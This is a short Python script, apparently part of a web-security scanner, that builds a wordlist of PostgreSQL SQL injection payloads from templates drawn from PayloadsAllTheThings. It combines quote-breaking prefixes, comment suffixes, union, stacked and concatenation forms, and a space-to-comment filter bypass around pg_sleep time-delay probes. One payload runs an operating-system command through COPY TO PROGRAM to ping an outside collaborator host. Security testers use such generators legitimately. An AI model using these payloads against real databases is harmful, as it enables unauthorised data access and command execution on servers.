# resources
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

prefixes = [
    '',
    ')',
    '{quotation_mark}',
    '{quotation_mark})',
]

suffixes = [
    '',
    '--',
    '/*',
    '%00'
]
suffixes = suffixes + [';' + s for s in suffixes]

quotation_marks = [
    '\'',
    '"'
]

generic_templates = [
    '{prefix}{payload}{suffix}',
    '{prefix} union {payload}{suffix}',
    '{prefix};({payload}){suffix}',
    '{prefix}||({payload}){suffix}',
]

string_concat_templates = [
    '{quotation_mark}||({payload})||{quotation_mark}'
]

payloads = [
    'select pg_sleep(20)',
    'select 1 from pg_sleep(20)',
    'copy (SELECT \'\') to program \'ping {collaborator}\''
]

def generate():
    wordlist = []

    # string concat
    for quotation_mark in quotation_marks:
        for string_concat_template in string_concat_templates:
            for payload in payloads:
                word = string_concat_template
                word = word.replace('{payload}',payload)
                word = word.replace('{quotation_mark}',quotation_mark)
                if word not in wordlist:
                    wordlist.append(word)

    # generic
    for quotation_mark in quotation_marks:
        for generic_template in generic_templates:
            for payload in payloads:
                for prefix in prefixes:
                    for suffix in suffixes:
                        word = generic_template
                        word = word.replace('{prefix}',prefix)
                        word = word.replace('{suffix}',suffix)
                        word = word.replace('{payload}',payload)
                        word = word.replace('{quotation_mark}',quotation_mark)
                        if word not in wordlist:
                            wordlist.append(word)
    
    # bypasses
    temp_wordlist = wordlist
    for word in temp_wordlist:
        word = word.replace(' ','/**/')
        if word not in wordlist:
            wordlist.append(word)
    
    return wordlist
